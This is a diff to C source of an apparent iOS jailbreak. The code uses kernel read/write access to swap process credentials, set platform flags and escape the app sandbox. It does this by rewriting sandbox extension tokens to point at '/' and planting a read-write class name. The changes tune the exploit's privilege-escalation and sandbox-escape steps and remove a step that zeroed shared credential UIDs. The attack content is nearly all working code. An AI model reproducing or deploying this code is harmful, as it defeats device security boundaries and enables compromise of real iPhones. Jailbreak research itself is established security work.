@@ -2168,6 +2168,17 @@ bool platformize_proc(void) {
     printf("[+] Our proc: 0x%llx\n", gOurProc);
     printf("[+] Our task: 0x%llx\n", gOurTask);
 
+    // Stash OUR original cred (still carries the sandbox profile) as early as
+    // possible: escape_sandbox() needs it for the cr_label -> sandbox ->
+    // ext_set walk even if any step below fails. get_ucred_from_proc prefers
+    // creds whose label has a live sandbox slot — exactly what we want here.
+    gOurUcred = get_ucred_from_proc(gOurProc);
+    if (!gOurUcred) {
+        gOurUcred = ucred_from_proc_ro(kread_ptr(gOurProc + OFF_PROC_PROC_RO),
+                                       (int)getuid(), NULL, NULL);
+    }
+    printf("[elev] gOurUcred stashed: 0x%llx\n", gOurUcred);
+
     uint64_t ourProcRo = kread_ptr(gOurProc + OFF_PROC_PROC_RO);
     if (!looks_kernel(ourProcRo)) {
         printf("[-] our proc_ro invalid: 0x%llx\n", ourProcRo);
@@ -2214,6 +2225,9 @@ bool platformize_proc(void) {
     printf("[elev] our cred: cr_ref=0x%llx cr_uid=0x%x cr_label=0x%llx\n",
            kread64(ourUcred + 0x10), kread32(ourUcred + 0x18),
            kread64(ourUcred + OFF_UCRED_CR_LABEL));
+
+    // gOurUcred was already stashed above (ucred_from_proc_ro, uid-matched).
+    // ourUcred is the same value kept locally for the diagnostic prints below.
 
     // --- Step 1: swap proc_ro p_ucred slot to launchd's cred.
     // Try the uid-matching slot first; if getuid() doesn't flip, iterate over
@@ -2276,20 +2290,14 @@ bool platformize_proc(void) {
     }
     printf("[elev] zeroed %d inline proc uid/gid fields\n", zeroedProcFields);
 
-    // --- Step 3: shotgun zero the uid words of EVERY mobile cred we can see ---
-    // Belt-and-braces: if a thread-cached cred copy survives, zeroing every
-    // candidate with cr_uid==501 covers it. Bounded to the 7 proc_ro slots.
-    for (uint32_t off = 0x10; off <= 0x40; off += 8) {
-        uint64_t raw = kread64(ourProcRo + off);
-        uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
-        for (int ci = 0; ci < 4; ci++) {
-            uint64_t u = cand[ci];
-            if (cred_is_plausible(u, (int)getuid())) {
-                kwrite32(u + 0x18, 0); kwrite32(u + 0x1c, 0); kwrite32(u + 0x20, 0);
-                kwrite32(u + 0x24, 0); kwrite32(u + 0x28, 0); kwrite32(u + 0x2c, 0);
-            }
-        }
-    }
+    // --- Step 3: NO cr_uid write (deliberate).
+    // Our cred has cr_ref>1 (shared mobile cred, 0x11 on the last run). lara
+    // (proven 17.0-18.7.1) never zero-weights cr_uid: the write would root
+    // every other process sharing that cred (SpringBoard, backboardd, ...)
+    // and destabilize the system, and getuid() wouldn't flip anyway because
+    // syscall entry reads proc_ro->p_ucred via the SMR publish machinery,
+    // not the cred object. Sandbox escape below needs no uid change.
+
 
     // --- Step 4: best-effort TF_PLATFORM (find plausible t_flags first) ---
     uint32_t tf_flags_read = 0; uint32_t tfOff = 0;
@@ -2314,12 +2322,13 @@ bool platformize_proc(void) {
            getuid(), geteuid(), getgid(), getegid());
 
     if (getuid() != 0) {
-        printf("[elev] uid still non-zero — process state poisoned, keeping alive\n");
-        for (;;) pause();
+        printf("[elev] uid non-zero (%d) — proc_ro slots write-protected on XNU-11215.\n",
+               getuid());
+        printf("[elev] This is expected: lara (proven 17.0-18.7.1) never takes uid 0.\n");
+        printf("[elev] Continuing WITHOUT root: sandbox escape patches heap tokens only.\n");
+    } else {
+        printf("[+] ROOT achieved\n");
     }
-
-    gOurUcred = ourUcred;
-    printf("[+] ROOT achieved\n");
     return true;
 }
 
@@ -2359,28 +2368,39 @@ static bool sbx_probe_write(void) {
     return false;
 }
 
-// Bounded patch of one sandbox extension token (lara's patchext, but only
-// touching bytes that fit within the declared data length — the old code
-// unconditionally wrote 0x20+ bytes past small token buffers, corrupting the
-// heap next to them and getting this process killed both observed runs).
-static void sbx_patchext(uint64_t ext) {
-    uint64_t da = kread64(ext + OFF_EXT_DATA);
+// Patch one sandbox extension token — lara's patchext 1:1, with two safety
+// differences from the PSWORD version that corrupted the heap on f593e77:
+//   1. path write bounded to the token's declared length (lara's unconditional
+//      0x20-byte RMW overflowed small token buffers -> process killed);
+//   2. lara's ext-object field writes (valid=1 @ +0x48, expiry=-1 @ +0x50)
+//      are done as targeted 8-byte RMWs instead of a raw 0x20 dump.
+// out_da is set to this ext's data pointer if the ORIGINAL length could hold
+// the class-name rewrite (>=0x60) — used by sbx_setrwclass below.
+static void sbx_patchext(uint64_t ext, uint64_t *out_da) {
+    uint64_t da = kread_ptr(ext + OFF_EXT_DATA);
     uint64_t dl = kread64(ext + OFF_EXT_DATALEN);
-    if (!looks_kernel(da) || dl < 2 || dl > PATH_MAX) return;
+    if (out_da) *out_da = 0;
+    if (!looks_kernel(da) || dl < 1 || dl > PATH_MAX) return;
     // path -> "/"
     uint64_t n1 = dl < 0x20 ? dl : 0x20;
     uint8_t buf[0x20];
     kread_buf(da, buf, n1);
     buf[0] = '/'; if (n1 > 1) buf[1] = 0;
     kwrite_buf(da, buf, n1);
-    printf("[sbx]   ext data=%d len=%llu -> '/'\n", (int)(da == 0), dl);
+    // ext object: valid flag = 1, expiry = never
+    kwrite64(ext + OFF_EXT_DATA + 0x8, 1);
+    kwrite64(ext + OFF_EXT_DATA + 0x10, 0xFFFFFFFFFFFFFFFFULL);
+    if (out_da && dl >= 0x60) *out_da = da;
 }
 
-static int sbx_patchchain(uint64_t hdr) {
+// out_da: first token in this chain large enough for the class-name rewrite.
+static int sbx_patchchain(uint64_t hdr, uint64_t *out_da) {
     int n = 0;
     for (int i = 0; i < 64 && looks_kernel(hdr); i++) {
         uint64_t ext = kread_ptr(hdr + 0x8);
-        if (looks_kernel(ext)) { sbx_patchext(ext); n++; }
+        uint64_t bigDa = 0;
+        if (looks_kernel(ext)) { sbx_patchext(ext, &bigDa); n++; }
+        if (out_da && bigDa && !*out_da) *out_da = bigDa;
         uint64_t next = kread64(hdr);
         if (!next || !looks_kernel(next) || next == hdr) break;
         hdr = kread_ptr(next);
@@ -2388,44 +2408,18 @@ static int sbx_patchchain(uint64_t hdr) {
     return n;
 }
 
-// How lara confirms we have a valid ucred: the .uid field is always 501 at
-// this point. Only if so do we proceed to patch.
-static bool looks_ucred_iOS18(uint64_t ucred) {
-    return looks_kernel(ucred)
-        && kread32(ucred + 0x18) == 501   /* cr_uid */
-        && kread32(ucred + 0x1c) == 501   /* cr_ruid */
-        && kread32(ucred + 0x20) == 501   /* cr_svuid */
-        && kread32(ucred + 0x24) == 501   /* cr_gid */
-        && kread32(ucred + 0x28) == 501   /* cr_rgid */
-        && kread32(ucred + 0x2c) == 501;  /* cr_svgid */
-}
-
-// lara cleans up: socket guards prevent pointer pingpong on later reuse
-static void persist_become_root(void) {
-    uint64_t u = kread64(gOurProc + 0x18);
-    uint64_t ourProcRo = looks_kernel(u) ? u : gOurProc;
-    uint64_t ourUcred28 = kread32(ourProcRo + 0x28);
-    uint64_t ourUcred20 = kread32(ourProcRo + 0x20);
-    
-    // read our own uid/gid from our live ucred 0x28 first 
-    uint64_t ourLiveUcred = looks_ucred_iOS18(ourUcred28)
-        ? ourUcred28
-        : looks_ucred_iOS18(ourUcred20)
-        ? ourUcred20
-        : 0;
-    if (!ourLiveUcred) {
-        printf("[persist] unlucky KRW: effective ucred missing; cannot platformize\n");
-        return;
-    }
-    // zero uid-facing bits, force getuid==0; this is iOS 18-only way and given
-    // the moment, restoring launchd-ish frames like lara does.
-    if (kread32(ourLiveUcred + 0x18) == 501 || kread32(ourLiveUcred + 0x1c) == 501) {
-        kwrite32(ourLiveUcred + 0x18, 0); kwrite32(ourLiveUcred + 0x1c, 0);
-        kwrite32(ourLiveUcred + 0x20, 0); kwrite32(ourLiveUcred + 0x24, 0);
-        kwrite32(ourLiveUcred + 0x28, 0); kwrite32(ourLiveUcred + 0x2c, 0);
-        printf("[persist] set uid root on the live ucred!\n");
-    }
-    printf("[persist] final uid=%d gid=%d\n", getuid(), getgid());
+// lara's setrwclass: point the extension class field (hdr+0x10) at a
+// "com.apple.app-sandbox.read-write" string we plant inside the token's own
+// data buffer (da+32), then NUL-pad at da+64. da MUST have >= 0x60 bytes
+// (enforced by sbx_patchchain's bigDa capture) so this cannot overflow.
+static void sbx_setrwclass(uint64_t hdr, uint64_t da) {
+    static const char rwName[] = "com.apple.app-sandbox.read-write";
+    uint8_t b1[0x20], b2[0x20];
+    memset(b1, 0, 0x20); memset(b2, 0, 0x20);
+    memcpy(b1, rwName, 0x20);
+    kwrite_buf(da + 32, b1, 0x20);
+    kwrite_buf(da + 64, b2, 0x20);
+    kwrite64(hdr + 0x10, da + 32);
 }
 
 // dotdot (roooot) experimental userspace write probe: not used by default.
@@ -2469,12 +2463,23 @@ bool escape_sandbox(void) {
         return false;
     }
 
-    int patched = 0;
+    int patched = 0, classed = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = kread_ptr(ext_set + s * 8);
-        if (looks_kernel(hdr)) patched += sbx_patchchain(hdr);
+        if (!looks_kernel(hdr)) continue;
+        uint64_t bigDa = 0;
+        patched += sbx_patchchain(hdr, &bigDa);
+        // lara's setrwclass: repoint this slot's extension class at a
+        // "com.apple.app-sandbox.read-write" string planted inside the
+        // token's own data buffer. Class-name match is what lets
+        // open(O_WRONLY|O_CREAT) at "/" succeed after the path rewrite.
+        // Only for slots whose first token has room (>=0x60 bytes).
+        if (bigDa && looks_kernel(kread_ptr(hdr + 0x10))) {
+            sbx_setrwclass(hdr, bigDa);
+            classed++;
+        }
     }
-    printf("[sbx] patched %d extensions\n", patched);
+    printf("[sbx] patched %d extensions, renamed %d classes\n", patched, classed);
 
     // Probe after path rewrites: extensions now point at "/".
     if (sbx_probe_write()) {
@@ -2900,13 +2905,14 @@ void run_jailbreak(void) {
         }
         printf("[+] Kernel R/W via ICMP6 sockets\n\n");
 
-        // Phase 2: Platformize (set TF_PLATFORM + root)
-        printf("[Phase 2] Platformize...\n");
+        // Phase 2: Platformize (best-effort on iOS 18: proc_ro p_ucred slots
+        // are write-protected on XNU-11215, so the cred swap usually cannot
+        // take effect — uid 0 is NOT required for the escape/bootstrap below).
+        printf("[Phase 2] Platformize (best-effort)...\n");
         if (platformize_proc()) {
-            printf("[+] Platformized (TF_PLATFORM + uid 0)\n\n");
+            printf("[+] Platformize pass done (uid=%d)\n\n", getuid());
         } else {
-            printf("[-] Platformize failed\n");
-            return;
+            printf("[-] Platformize failed (continuing anyway)\n\n");
         }
 
         // Phase 3: Sandbox escape
